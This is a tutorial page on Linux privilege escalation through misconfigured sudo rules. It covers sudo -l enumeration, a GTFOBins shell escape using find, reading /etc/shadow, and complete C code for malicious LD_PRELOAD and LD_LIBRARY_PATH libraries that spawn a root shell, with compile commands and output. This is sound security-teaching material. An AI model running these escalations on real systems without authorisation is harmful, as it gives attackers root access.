---
description: >-
  Commands you are allowed to run as root, which may allow you to escape from
  the command into a root shell
---

# Sudo

## Finding sudo commands

Simply using this command you get a list of commands you can execute as other users.&#x20;

```bash
sudo -l
```

If you get any error message like these, it means you probably cannot use this technique for this user:

> Sorry, user \<username> may not run sudo on \<machine>.

> \<username> is not in the sudoers file. This incident will be reported.

In the best-case scenario, you can run any command (even `sudo /bin/bash`) as root (without a password):

```bash
Matching Defaults entries for <username> on <machine>:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
    
User <username> may run the following commands on <machine>:
    (ALL) NOPASSWD: ALL
```

Another example is if you can only execute a certain program or the `NOPASSWD` tag is not set meaning you do need the user's password.&#x20;

```bash
Matching Defaults entries for <username> on <machine>:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User <username> may run the following commands on <machine>:
    (ALL : ALL) /usr/bin/find
```

## Exploiting a sudo program

Now that we have a list of programs we are allowed to use, we can see if we can get a shell in any way. To do this you look up the program on [GTFOBins](https://gtfobins.github.io/#+sudo). If it has the `Sudo` tag set, it means you can use it to get some elevated privilege.&#x20;

{% embed url="https://gtfobins.github.io/#+sudo" %}
GTFOBins, a searchable list of exploitable binaries
{% endembed %}

Then just use the command to get a shell. With the `/usr/bin/find` binary it would be this for example:

```bash
sudo find . -exec /bin/sh \; -quit
```

If the binary does not allow you to get a shell instantly, you can try other things like file reading to read the `/etc/shadow` file containing password hashes. More information about cracking these shadow hashes in [#cracking-shadow-hashes](../../cryptography/hashing/cracking-hashes.md#cracking-shadow-hashes "mention").&#x20;

### env\_keep

Sometimes the program itself is not exploitable, but there may be a `env_keep` option. This option allows you to inherit environment variables while executing the program, letting it do different things than normal. Two dangerous environment variables here are `LD_PRELOAD` and `LD_LIBRARY_PATH`, because they allow you to overwrite the libc path of the program to another file that you can control. This means you can execute any C library you make before the real sudo program runs.&#x20;

```shell-session
$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

User user may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/apache2
```

The first `LD_PRELOAD` just specifies the direct path to the library. To compile a malicious library yourself just make some C code to execute a privileged shell, and compile it like a library:

{% code title="preload.c" %}
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);  // Root permissions
        system("/bin/bash -p");  // Start bash shell
}
```
{% endcode %}

```shell-session
$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
```

Now you have the malicious preload.so file that you can include by setting the `LD_PRELOAD` before running the allowed sudo program (make sure to use the full path):

```shell-session
$ sudo LD_PRELOAD=/tmp/preload.so /usr/sbin/apache2
# id
uid=0(root) gid=0(root) groups=0(root)
```

Then for the `LD_LIBRARY_PATH` option there is another similar way. This variable only sets the directory to find the other libraries in, so we first need to know what libraries are loaded to then overwrite them. Do this using `ldd`:

```shell-session
$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fff8f5ff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f52d4527000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007f52d4303000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007f52d40c9000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007f52d3ead000)
        libc.so.6 => /lib/libc.so.6 (0x00007f52d3b41000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007f52d393c000)
        librt.so.1 => /lib/librt.so.1 (0x00007f52d3734000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007f52d34fd000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007f52d32f8000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007f52d30d0000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f52d49e4000)
```

We can choose any of these filenames to overwrite. Let's take `libcrypt.so.1` for example. We'll again compile some C code to a valid library with the functions that it will expect:

{% code title="library_path.c" %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));  // Function that is called

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);  // Root permissions
        system("/bin/bash -p");  // // Start bash shell
}
```
{% endcode %}

Then we compile it again to a library and set the `LD_LIBRARY_PATH` to a directory containing our malicious library:

```shell-session
$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c
$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
# id
uid=0(root) gid=0(root) groups=0(root)
```
